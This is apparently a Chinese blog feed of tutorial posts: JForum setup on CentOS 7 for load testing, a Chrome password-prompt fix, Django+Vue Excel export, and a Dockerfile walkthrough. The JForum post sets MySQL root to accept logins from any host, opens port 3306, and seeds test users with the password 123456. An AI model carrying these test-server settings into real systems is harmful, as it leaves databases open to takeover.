是你的访问目录</span><br><span class="line">        root   /home/dist;</span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;      </span><br><span class="line">        </span><br><span class="line">        #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">        # redirect server error pages to the static page /50x.html</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">        #</span><br><span class="line">        #location ~ \.php$ &#123;</span><br><span class="line">        #    root           html;</span><br><span class="line">        #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">        #    fastcgi_index  index.php;</span><br><span class="line">        #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">        #    include        fastcgi_params;</span><br><span class="line">        #&#125;</span><br><span class="line"></span><br><span class="line">        # deny access to .htaccess files, if Apache&#x27;s document root</span><br><span class="line">        # concurs with nginx&#x27;s one</span><br><span class="line">        #</span><br><span class="line">        #location ~ /\.ht &#123;</span><br><span class="line">        #    deny  all;</span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>关掉防火墙的端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//8088，自己指定端口</span><br><span class="line">firewall-cmd --permanent --add-port=8880/tcp --zone=public  </span><br><span class="line">//重新加载</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>重启nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//检查配置是否正确</span><br><span class="line">./nginx -t</span><br><span class="line">//启动nginx</span><br><span class="line">./nginx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>前台正常访问<br><img src="/aposts/1d89e362/vue.png" alt="image.png"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>centos7搭建jforum</title>
    <url>/aposts/65807ab6/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>作为性能测试的压测目标网站，本次教程主要是在centos7上搭建iforum论坛的步骤</p>
<h3 id="按照mysql"><a href="#按照mysql" class="headerlink" title="按照mysql"></a>按照mysql</h3><ul>
<li><p>去官网查看最新安装包<br><a href="https://links.jianshu.com/go?to=https://dev.mysql.com/downloads/repo/yum/">https://dev.mysql.com/downloads/repo/yum/</a></p>
</li>
<li><p>下载MySQL源安装包</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">wget hhttps:<span class="comment">//repo.mysql.com//mysql80-community-release-el7-3.noarch.rpm</span></span><br></pre></td></tr></table></figure>

<ul>
<li>安装MySql源</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@racknerd-4dbd89 <span class="built_in">local</span>]<span class="comment"># rpm -ivh mysql80-community-release-el7-3.noarch.rpm</span></span><br><span class="line">warning: mysql80-community-release-el7-3.noarch.rpm: Header V3 DSA/SHA1 Signature, key ID 5072e1f5: NOKEY</span><br><span class="line">Preparing...                          <span class="comment">################################# [100%]</span></span><br><span class="line">Updating / installing...</span><br><span class="line">   1:mysql80-community-release-el7-3  <span class="comment">################################# [100%]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>安装MySQL服务器<br><code>yum install mysql-community-server</code></p>
</li>
<li><p>开启mysql服务</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">service mysqld <span class="keyword">start</span></span><br></pre></td></tr></table></figure>

<ul>
<li>mysql安装成功后创建的超级用户‘root‘@’localhost’的密码会被存储在<code>/var/log/mysqld.log</code>，可以使用如下命令查看密码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&#x27;temporary password&#x27;</span> /var/log/mysqld.log</span><br></pre></td></tr></table></figure>

<ul>
<li><p>输入 <code>mysql -u root -p</code>,输入得到的密码，然后修改密码：</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">ALTER USER <span class="comment">&#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;new password&#x27;;</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>添加远程登录用户</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">mysql&gt; select host, user from user;</span><br><span class="line">+-----------+------------------+</span><br><span class="line">| host      | user             |</span><br><span class="line">+-----------+------------------+</span><br><span class="line">| localhost | mysql.infoschema |</span><br><span class="line">| localhost | mysql.session    |</span><br><span class="line">| localhost | mysql.sys        |</span><br><span class="line">| localhost | root             |</span><br><span class="line">+-----------+------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"><span class="comment"># 查看表格中 root 用户的 host，默认应该显示的 localhost，只支持本地访问，不允许远程访问。</span></span><br><span class="line"></span><br><span class="line">update user <span class="built_in">set</span> host=<span class="string">&#x27;%&#x27;</span> <span class="built_in">where</span> user =<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="comment"># 说明： % 代表任意的客户端,可替换成具体IP地址。</span></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<ul>
<li>防火墙中开放mysql的访问端口</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=3306/tcp --permanent</span><br><span class="line">firewall-cmd --reload   <span class="comment"># 配置立即生效</span></span><br><span class="line">firewall-cmd --zone=public --list-port <span class="comment"># 查看防火墙所有开放的端口</span></span><br><span class="line">firewall-cmd --state <span class="comment"># 查看防火墙状态</span></span><br><span class="line">netstat -lnpt <span class="comment"># 查看监听的端口</span></span><br><span class="line">netstat -lnpt |grep 3306 <span class="comment"># 查看监听的具体端口</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>用HeidiSQL远程连接mysql成功</p>
<p><img src="/aposts/65807ab6/image-20211020114616786.png" alt="image-20211020114616786"></p>
</li>
<li><p>新建数据库，名字为：iforum</p>
<p><img src="/aposts/65807ab6/image-20211020163450656.png" alt="image-20211020163450656"></p>
</li>
</ul>
<h3 id="安装java"><a href="#安装java" class="headerlink" title="安装java"></a>安装java</h3><ul>
<li><p>我的服务器上已经按照好了java</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@racknerd-4dbd89 ~]<span class="comment"># java -version</span></span><br><span class="line">java version <span class="string">&quot;1.8.0_291&quot;</span></span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_291-b10)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.291-b10, mixed mode)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="安装tomcat"><a href="#安装tomcat" class="headerlink" title="安装tomcat"></a>安装tomcat</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.72/bin/apache-tomcat-8.5.72.tar.gz</span><br><span class="line">tar  zxvf apache-tomcat-8.5.72.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动tomcat</span></span><br><span class="line">[root@racknerd-4dbd89 bin]<span class="comment"># sh startup.sh</span></span><br><span class="line">Using CATALINA_BASE:   /usr/local/apache-tomcat-8.5.72</span><br><span class="line">Using CATALINA_HOME:   /usr/local/apache-tomcat-8.5.72</span><br><span class="line">Using CATALINA_TMPDIR: /usr/local/apache-tomcat-8.5.72/temp</span><br><span class="line">Using JRE_HOME:        /usr/jdk1.8.0_291/jre</span><br><span class="line">Using CLASSPATH:       /usr/local/apache-tomcat-8.5.72/bin/bootstrap.jar:/usr/local/apache-tomcat-8.5.72/bin/tomcat-juli.jar</span><br><span class="line">Using CATALINA_OPTS:</span><br><span class="line">Tomcat started.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="配置tomcat"><a href="#配置tomcat" class="headerlink" title="配置tomcat"></a>配置tomcat</h4><ul>
<li>防火墙开发8080端口给tomcat</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<ul>
<li><p>已经可以访问</p>
<p><img src="/aposts/65807ab6/image-20211020162109704.png" alt="image-20211020162109704"></p>
</li>
</ul>
<h3 id="安装jforum"><a href="#安装jforum" class="headerlink" title="安装jforum"></a>安装jforum</h3><ul>
<li><p><a href="https://sourceforge.net/projects/jforum2/files/latest/download">打开地址</a>并下载</p>
</li>
<li><p>将 jforum-2.6.2.war放到tomcat目录的webapps下；</p>
</li>
<li><p>重启tomcat，<code>sh shutdown.sh   sh startup.sh</code></p>
</li>
<li><p>输入 host:8080&#x2F;jforum-2.6.2 进入安装流程</p>
<p><img src="/aposts/65807ab6/image-20211020165041066.png" alt="image-20211020165041066"></p>
<p><img src="/aposts/65807ab6/image-20211020165234244.png" alt="image-20211020165234244"></p>
</li>
</ul>
<p><img src="/aposts/65807ab6/image-20211020165311313.png" alt="image-20211020165311313"></p>
<p><img src="/aposts/65807ab6/image-20211020171443069.png" alt="image-20211020171443069"></p>
<h3 id="新增批量用户"><a href="#新增批量用户" class="headerlink" title="新增批量用户"></a>新增批量用户</h3><ul>
<li><p>新增存储过程，批量新增用户，密码都是123456</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">DECLARE</span> userName <span class="type">VARCHAR</span> (<span class="number">20</span>) ;</span><br><span class="line"><span class="keyword">DECLARE</span> userMail <span class="type">VARCHAR</span> (<span class="number">20</span>) ;</span><br><span class="line"><span class="keyword">DECLARE</span> i <span class="type">INT</span> <span class="keyword">DEFAULT</span> <span class="number">9</span>;#原来是<span class="number">1</span>，要看jforum_users表最新一个用户的id是多少，要比最新那个用户id大就行</span><br><span class="line">WHILE i<span class="operator">&lt;=</span> <span class="number">400</span> DO</span><br><span class="line"><span class="keyword">set</span> userName <span class="operator">=</span> CONCAT (<span class="string">&#x27;test1&#x27;</span>, LPAD ( i, <span class="number">3</span>, <span class="string">&#x27;0&#x27;</span> )) ;</span><br><span class="line"><span class="keyword">set</span> userMail <span class="operator">=</span> CONCAT (userName, <span class="string">&#x27;@test.com&#x27;</span> ) ;</span><br><span class="line">#密码<span class="number">123456</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> jforum_users <span class="keyword">VALUES</span> (i, <span class="string">&#x27;1&#x27;</span>, userName,   <span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">  <span class="keyword">null</span>, <span class="string">&#x27;2015-05-06 09:33:18&#x27;</span>, <span class="keyword">NULL</span>,    <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;&#x27;</span>,   <span class="string">&#x27;%d/%M/%Y %H:%i&#x27;</span>, <span class="string">&#x27;0&#x27;</span>,    <span class="string">&#x27;0&#x27;</span>, <span class="keyword">null</span>, <span class="keyword">NULL</span>,    <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;0&#x27;</span>,    <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>,    <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>,    <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>,   <span class="string">&#x27;0&#x27;</span>, <span class="keyword">NULL</span>,   <span class="string">&#x27;0&#x27;</span>,userMail, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> jforum_user_groups <span class="keyword">VALUES</span> (<span class="number">2</span>,i) ;</span><br><span class="line"><span class="keyword">SET</span> i <span class="operator">=</span> i<span class="operator">+</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">END</span> WHILE;</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/aposts/65807ab6/image-20211111112111795.png" alt="image-20211111112111795"></p>
]]></content>
      <categories>
        <category>性能测试</category>
      </categories>
      <tags>
        <tag>性能测试</tag>
        <tag>环境搭建</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>chrome无保存密码提示</title>
    <url>/aposts/9dc1ed8/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>chrome导入密码后，无反应</li>
<li>chrome保存密码，也没有任何提示</li>
</ul>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
<li>浏览器中输入<code>chrome://flags/</code>，找到<code>Password import</code>，把值重新禁止和打开。</li>
</ul>
<blockquote>
<p>此操作也使用无导入密码按钮的问题</p>
</blockquote>
<p><img src="/aposts/9dc1ed8/image-20220822094625395.png" alt="image-20220822094625395"></p>
<ul>
<li>运行中输入：<code>%LOCALAPPDATA%\Google\Chrome\User Data\Default</code>，打开Chrome保存用户信息的路径，删除已经保存的用户信息（Login开头的文件）</li>
</ul>
<p><img src="/aposts/9dc1ed8/image-20220822095203160.png" alt="image-20220822095203160"></p>
<ul>
<li>重启chrome浏览器后，无论是导入密码，还是提示密码保存功能，都已经可以了</li>
</ul>
]]></content>
      <categories>
        <category>软件使用</category>
      </categories>
      <tags>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>django+vue下载excel</title>
    <url>/aposts/d6f6ea0/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本次代码主要是针对vue下载excel文件</p>
<h2 id="服务器代码"><a href="#服务器代码" class="headerlink" title="服务器代码"></a>服务器代码</h2><ul>
<li><p><code>django</code>代码逻辑，每次客户端点击下载文件，服务器进行判断</p>
</li>
<li><p>如果服务器路径上已经存在了生成的excel文件，就直接下载；否则就生成excel文件，然后下载</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reports_top_slow_export</span>(<span class="params">request</span>):</span><br><span class="line">    data = []</span><br><span class="line">    <span class="comment"># 每次都删除excel，然后重建</span></span><br><span class="line">    name = <span class="string">&quot;top10慢的接口&quot;</span></span><br><span class="line">    excel_name = os.path.join(Element.REPORT_FILE, name) + <span class="string">&quot;.xlsx&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(excel_name):</span><br><span class="line">        os.remove(excel_name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件已经删除&quot;</span> + excel_name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(excel_name, <span class="string">&#x27;a+&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;创建文件成功&quot;</span> + excel_name)</span><br><span class="line"></span><br><span class="line">    item_entry = ReportItem.objects.<span class="built_in">all</span>().order_by(<span class="string">&quot;-sum_time&quot;</span>)[:<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> item_entry:</span><br><span class="line">        url = i.protocol + <span class="string">&quot;//&quot;</span> + i.url</span><br><span class="line">        <span class="keyword">if</span> i.result == <span class="number">1</span>:</span><br><span class="line">            result = <span class="string">&quot;通过&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="string">&quot;失败&quot;</span></span><br><span class="line"></span><br><span class="line">        data.append(&#123;<span class="string">&quot;url&quot;</span>: url, <span class="string">&quot;params&quot;</span>: i.params, <span class="string">&quot;name&quot;</span>: i.name, <span class="string">&quot;method&quot;</span>: i.method, <span class="string">&quot;hope&quot;</span>: i.hope,</span><br><span class="line">                     <span class="string">&quot;result&quot;</span>: result, <span class="string">&quot;sum_time&quot;</span>: i.sum_time + <span class="string">&quot;ms&quot;</span>, <span class="string">&quot;fact&quot;</span>: i.fact&#125;)</span><br><span class="line"></span><br><span class="line">        workbook = xlsxwriter.Workbook(excel_name, &#123;<span class="string">&quot;string_to_urls&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">        worksheet = workbook.add_worksheet(<span class="string">&quot;响应时间最慢的top10&quot;</span>)</span><br><span class="line">        worksheet.write(<span class="string">&quot;A1&quot;</span>, <span class="string">&quot;用例名&quot;</span>)</span><br><span class="line">        worksheet.set_column(<span class="string">&quot;B:B&quot;</span>, <span class="number">60</span>)</span><br><span class="line">        worksheet.write(<span class="string">&quot;B1&quot;</span>, <span class="string">&quot;url&quot;</span>)</span><br><span class="line">        worksheet.write(<span class="string">&quot;C1&quot;</span>, <span class="string">&quot;请求方法&quot;</span>)</span><br><span class="line">        worksheet.write(<span class="string">&quot;D1&quot;</span>, <span class="string">&quot;入参&quot;</span>)</span><br><span class="line">        worksheet.write(<span class="string">&quot;E1&quot;</span>, <span class="string">&quot;期望结果&quot;</span>)</span><br><span class="line">        worksheet.write(<span class="string">&quot;F1&quot;</span>, <span class="string">&quot;实际结果&quot;</span>)</span><br><span class="line">        worksheet.set_column(<span class="string">&quot;F:F&quot;</span>, <span class="number">60</span>)</span><br><span class="line">        worksheet.write(<span class="string">&quot;G1&quot;</span>, <span class="string">&quot;是否通过&quot;</span>)</span><br><span class="line">        worksheet.write(<span class="string">&quot;H1&quot;</span>, <span class="string">&quot;耗时&quot;</span>)</span><br><span class="line">        temp = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">            worksheet.write(<span class="string">&quot;A&quot;</span> + <span class="built_in">str</span>(temp), j[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">            worksheet.write(<span class="string">&quot;B&quot;</span> + <span class="built_in">str</span>(temp), j[<span class="string">&quot;url&quot;</span>])</span><br><span class="line">            worksheet.write(<span class="string">&quot;C&quot;</span> + <span class="built_in">str</span>(temp), j[<span class="string">&quot;method&quot;</span>])</span><br><span class="line">            worksheet.write(<span class="string">&quot;D&quot;</span> + <span class="built_in">str</span>(temp), j[<span class="string">&quot;params&quot;</span>])</span><br><span class="line">            worksheet.write(<span class="string">&quot;E&quot;</span> + <span class="built_in">str</span>(temp), j[<span class="string">&quot;hope&quot;</span>])</span><br><span class="line">            worksheet.write(<span class="string">&quot;F&quot;</span> + <span class="built_in">str</span>(temp), j[<span class="string">&quot;fact&quot;</span>])</span><br><span class="line">            worksheet.write(<span class="string">&quot;G&quot;</span> + <span class="built_in">str</span>(temp), j[<span class="string">&quot;result&quot;</span>])</span><br><span class="line">            worksheet.write(<span class="string">&quot;H&quot;</span> + <span class="built_in">str</span>(temp), j[<span class="string">&quot;sum_time&quot;</span>])</span><br><span class="line">            temp += <span class="number">1</span></span><br><span class="line">        workbook.close()</span><br><span class="line"></span><br><span class="line">    file_name1 = os.path.join(settings.BASE_DIR, <span class="string">&quot;myapi/Report&quot;</span>,name + <span class="string">&quot;.xlsx&quot;</span>)</span><br><span class="line">    file = <span class="built_in">open</span>(file_name1, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    response = StreamingHttpResponse(file)</span><br><span class="line">    response[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">    response[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment;filename=&quot;&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(name)</span><br><span class="line">    <span class="comment"># file.close() 这里关闭会导致报错</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<h2 id="vue代码"><a href="#vue代码" class="headerlink" title="vue代码"></a>vue代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">async reportExport() &#123;</span><br><span class="line">          this.$http.get(&quot;reports_top_slow_export&quot;, &#123;responseType:&quot;blob&quot;&#125;).then(response =&gt; &#123;</span><br><span class="line">        if(response.statusText==&quot;OK&quot;)&#123;</span><br><span class="line">               let downloadURL = this.dataURLtoBlob(response.data)</span><br><span class="line">               let anchor = document.createElement(&quot;a&quot;)</span><br><span class="line">               //下载时显示的文件名（自定义）</span><br><span class="line">               anchor.download = &#x27;top10最慢接口.xlsx&#x27;</span><br><span class="line">               anchor.href = downloadURL</span><br><span class="line">               anchor.click()</span><br><span class="line">               this.$message(&#123;type: &#x27;success&#x27;, message: &#x27;下载成功!&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">           &#125; else &#123;</span><br><span class="line">               this.$message(&#123;type: &#x27;success&#x27;, error: &#x27;下载失败!&#x27;&#125;)</span><br><span class="line">           &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">       &#125;,</span><br><span class="line">        dataURLtoBlob(encoded)&#123;</span><br><span class="line">           const dataBlob = new Blob([encoded]);</span><br><span class="line">           return window.URL.createObjectURL(dataBlob);</span><br><span class="line">       &#125;,</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>docker之Dockerfile</title>
    <url>/aposts/160cc26a/</url>
    <content><![CDATA[<h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><ul>
<li><p>本文搭建步骤来自<a href="https://www.cnblogs.com/gsxl/p/12129322.html">这里</a></p>
</li>
<li><p>Dockerfile 可以自定义编写镜像，简单来说就类似写shell脚本</p>
</li>
<li><p>Dockerfile命令科普</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>关键字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>FROM</td>
<td>基础镜像，当前新镜像是基于哪个镜像的</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>镜像维护者的姓名和邮箱地址</td>
</tr>
<tr>
<td>RUN</td>
<td>容器构建时需要运行的命令</td>
</tr>
<tr>
<td>EXPOSE</td>
<td>当前容器对外暴露出的端口</td>
</tr>
<tr>
<td>WORKDIR</td>
<td>指定在创建容器后，终端默认登陆的进来工作目录，一个落脚点</td>
</tr>
<tr>
<td>ENV</td>
<td>用来在构建镜像过程中设置环境变量</td>
</tr>
<tr>
<td>ADD</td>
<td>将宿主机目录下的文件拷贝进镜像且 ADD 命令会自动处理 URL 和解压 tar 压缩包</td>
</tr>
<tr>
<td>COPY</td>
<td>类似 ADD，拷贝文件和目录到镜像中。（COPY src dest 或 COPY [“src”,”dest”]）</td>
</tr>
<tr>
<td>VOLUME</td>
<td>容器数据卷，用于数据保存和持久化工作</td>
</tr>
<tr>
<td>CMD</td>
<td>指定一个容器启动时要运行的命令，Dockerfile 中可以有多个 CMD 指令，但只有最后一个生效，CMD 会被 docker run 之后的参数替换</td>
</tr>
<tr>
<td>ENTRYPOINT</td>
<td>指定一个容器启动时要运行的命令，ENTRYPOINT 的目的和 CMD 一样，都是在指定容器启动程序及参数</td>
</tr>
<tr>
<td>ONBUILD</td>
<td>当构建一个被继承的 Dockerfile 时运行命令，父镜像在被子继承后父镜像的 onbuild 被触发</td>
</tr>
</tbody></table>
<ul>
<li>网上的图片介绍的还不错，仅供参考</li>
</ul>
<p><img src="/aposts/160cc26a/image-20220322162743943.png" alt="image-20220322162743943"></p>
<h3 id="本地代码"><a href="#本地代码" class="headerlink" title="本地代码"></a>本地代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import pytest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.mark.finished</span><br><span class="line">def test_add():</span><br><span class="line">    print(&quot;测试函数：test_add&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.mark.finished</span><br><span class="line">def test_subtract():</span><br><span class="line">    print(&quot;测试函数：test_subtract&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.mark.finished</span><br><span class="line">def test_request():</span><br><span class="line">    res = requests.get(&quot;http://www.baidu.com&quot;)</span><br><span class="line">    assert res.status_code == 201</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@pytest.mark.unfinished</span><br><span class="line">def test_no_finish():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    pytest.main([&quot;-s&quot;, &quot;test.py&quot;])</span><br></pre></td></tr></table></figure>

<ul>
<li>导出依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install pipreqs</span><br><span class="line">pipreqs --use-local --encoding=utf8 --force .</span><br></pre></td></tr></table></figure>

<ul>
<li>得到依赖文件(<code>requirements.tx</code>t)如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pytest==6.2.4</span><br><span class="line">requests==2.24.0</span><br></pre></td></tr></table></figure>

<h2 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos data]# pwd</span><br><span class="line">/usr/local/docker-demo/data</span><br><span class="line"></span><br><span class="line">[root@VM-24-13-centos data]# ll</span><br><span class="line">total 16</span><br><span class="line">-rw-r--r-- 1 root root  264 Mar 22 17:47 Dockerfile</span><br><span class="line">drwxr-xr-x 2 root root 4096 Mar 22 17:57 __pycache__</span><br><span class="line">-rw-r--r-- 1 root root   33 Mar 22 17:36 requirements.txt # 依赖文件</span><br><span class="line">-rw-r--r-- 1 root root  467 Mar 22 17:36 test.py # 源代码</span><br></pre></td></tr></table></figure>

<ul>
<li>编写Dockerfile</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi Dockerfile</span><br><span class="line"># 基础镜像</span><br><span class="line">FROM rackspacedot/python37</span><br><span class="line"># 作者信息</span><br><span class="line">MAINTAINER gsxl  &lt;xxxx@qq.com&gt;</span><br><span class="line"># 升级pip</span><br><span class="line">RUN pip install --upgrade pip</span><br><span class="line"># 容器的工作目录</span><br><span class="line">WORKDIR /python</span><br><span class="line"># 把依赖文件拷贝到容器的工作目录</span><br><span class="line">COPY requirements.txt /python</span><br><span class="line"># 安装容器工作目录下的依赖文件</span><br><span class="line">RUN pip install -r /python/requirements.txt -i https://pypi.douban.com/simple</span><br><span class="line"># 指定容器启动程序及参数</span><br><span class="line">ENTRYPOINT [&quot;pytest&quot;]</span><br><span class="line">CMD [&quot;--help&quot;]</span><br></pre></td></tr></table></figure>

<ul>
<li>编译<code>dockerfile</code>，<code> build</code> 运行（注意后面有个 . ）：<code>dcoker build -t 镜像:标签 .</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@VM-24-13-centos data]# docker build -t test_py:v1 .</span><br><span class="line">Sending build context to Docker daemon  4.096kB</span><br><span class="line">Step 1/8 : FROM rackspacedot/python37</span><br><span class="line"> ---&gt; 4513b6d75e1c</span><br><span class="line">Step 2/8 : MAINTAINER gsxl  &lt;xxxx@qq.com&gt;</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; 97ee10a89cc0</span><br><span class="line">Step 3/8 : RUN pip install --upgrade pip</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; 7e71f8ad49e6</span><br><span class="line">Step 4/8 : WORKDIR /python</span><br><span class="line"> ---&gt; Using cache</span><br><span class="line"> ---&gt; 961389b2c6d2</span><br><span class="line">Step 5/8 : COPY requirements.txt /python</span><br><span class="line"> ---&gt; 26d36133bc07</span><br><span class="line">Step 6/8 : RUN pip install -r /python/requirements.txt -i https://pypi.douban.com/simple</span><br><span class="line"> ---&gt; Running in 8d36f9506780</span><br><span class="line">Looking in indexes: https://pypi.douban.com/simple</span><br><span class="line">Collecting pytest==6.2.4</span><br><span class="line">  Downloading https://pypi.doubanio.com/packa</span><br><span class="line">  Successfully built 1473b91e578e</span><br><span class="line">Successfully tagged test_py:v1</span><br></pre></td></tr></table></figure>

<ul>
<li>编译<code>dockerfile</code>成功后，会生成镜像文件，下面的<code>test_py</code> 就是刚刚生成的</li>
</ul>
